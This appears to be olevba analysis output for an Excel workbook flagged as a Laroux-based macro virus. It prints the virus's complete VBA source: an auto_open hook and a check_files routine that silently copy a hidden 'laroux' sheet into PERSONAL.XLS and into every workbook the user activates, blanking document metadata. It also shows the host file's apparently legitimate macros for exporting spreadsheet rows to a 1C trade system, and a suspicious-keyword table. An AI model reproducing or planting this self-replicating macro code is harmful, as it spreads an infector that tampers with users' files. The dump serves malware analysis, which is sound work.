olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-f99b9b929ff21763caf283ce90ddf0be96cc8f01
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-f99b9b929ff21763caf283ce90ddf0be96cc8f01 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub
Sub Exel_to_trade()
Attribute Exel_to_trade.VB_ProcData.VB_Invoke_Func = " \n14"
Dim trade As Object
Dim Nak As Object
Dim Tov As Object
Dim f As Object
Dim T1
Dim tt_kod
Set trade = CreateObject("V7.Application")
result = trade.Initialize(trade.RMTrade, "", "")
Set Nak = trade.EvalExpr("CreateObject(""Документ.РасходнаяНал"")")
Set Tov = trade.EvalExpr("CreateObject(""Справочник.Товары"")")
Set cklad = trade.EvalExpr("CreateObject(""Справочник.Склады"")")

Nak.New
cklad.НайтиПоКоду (1)
    If cklad.Выбран() > 0 Then
      Nak.Склад = cklad.ТекущийЭлемент
    End If
    'Nak.ВидТорговли = Перечисление.ВидыТорговли.ЗаНал
   ' ТипНакладной = Перечисление.ТипыНакладных.Расходная
    'ПризнакНакладной = Перечисление.ПризнРасхНакл.Продажа
    'ДатаДок=РабочаяДата();
For Count = 2 To 285
        If Cells(Count, 11).Value > 0 Then
           tt_kod = Cells(Count, 2).Value
           Tov.НайтиПоКоду (tt_kod)
           If Tov.Выбран() > 0 Then
              Nak.НоваяСтрока
              Nak.Товар = Tov.ТекущийЭлемент
              Nak.Количество = Cells(Count, 11).Value
              Nak.Стандарт = Tov.ТекущийЭлемент.Стандарт
              Nak.Цена = Tov.ТекущийЭлемент.Розн_Цена
           'Set f = trade.EvalExpr("Выч_суммы_накл(Контекст)")
           End If
        End If
Next Count
Nak.Записать
End Sub

Sub Exel_to_trade_ost()
Attribute Exel_to_trade_ost.VB_ProcData.VB_Invoke_Func = " \n14"
Dim trade As Object
Dim Nak As Object
Dim Tov As Object
Dim f As Object
Dim mm As Object
Dim T1
Dim tt_kod
Set trade = CreateObject("V7.Application")
result = trade.Initialize(trade.RMTrade, "", "")
Set Nak = trade.EvalExpr("CreateObject(""Документ.ВводОстатковТоваров"")")
Set Tov = trade.EvalExpr("CreateObject(""Справочник.Товары"")")
Set cklad = trade.EvalExpr("CreateObject(""Справочник.Склады"")")

Nak.New
'Nak.НомерДок = "Вот-00099"
cklad.НайтиПоКоду (1)
    If cklad.Выбран() > 0 Then
      Nak.Склад = cklad.ТекущийЭлемент
    End If
    'Nak.ВидТорговли = Перечисление.ВидыТорговли.ЗаНал
   ' ТипНакладной = Перечисление.ТипыНакладных.Расходная
    'ПризнакНакладной = Перечисление.ПризнРасхНакл.Продажа
    'ДатаДок=РабочаяДата();
    Set mm = trade.EvalExpr("CreateObject(""Справочник.МестаСкл"")")
For Count = 2 To 20
        'If Cells(Count, 9).Value > 0 Then
           tt_kod = Cells(Count, 2).Value
           Tov.НайтиПоКоду (tt_kod)
           If Tov.Выбран() > 0 Then
              Nak.НоваяСтрока
              Nak.Товар = Tov.ТекущийЭлемент
              Nak.Остаток = Cells(Count, 9).Value
              mm_kod = Cells(Count, 7).Value
              mm.ИспользоватьВладельца (cklad.ТекущийЭлемент)
              mm.НайтиПоКоду (mm_kod)
             If mm.Выбран() > 0 Then
                 Nak.Место = Cells(Count, 7).Value
             Else
               MsgBox "Место нет на складе " & Cells(Count, 7).Value
               Nak.Место = 0
             End If
              'Nak.Цена = Tov.ТекущийЭлемент.Розн_Цена
          ' Set f = trade.EvalExpr("Выч_суммы_накл(Контекст)")
           Else
             MsgBox "Книга не найдена " & Cells(Count, 1).Value
           End If
        'End If
Next Count
Nak.Записать
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  larou
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tem
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Octobe
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Novembe
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Decembe
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  By Packag
' 0085     27 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Direct and Indirec
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Top 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Handset
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|CreateObject        |May create an OLE object                     |
+----------+--------------------+---------------------------------------------+

